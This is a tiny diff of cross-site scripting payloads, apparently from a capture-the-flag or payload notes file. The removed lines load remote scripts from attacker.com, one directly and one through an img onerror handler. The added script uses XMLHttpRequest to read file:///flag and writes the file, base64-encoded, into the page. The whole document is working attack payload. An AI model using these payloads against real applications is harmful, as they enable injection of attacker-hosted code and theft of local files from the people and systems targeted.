@@ -1,2 +1,5 @@
-<script src="http://attacker.com/myscripts.js"></script>
-<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///flag");x.send();
+</script>
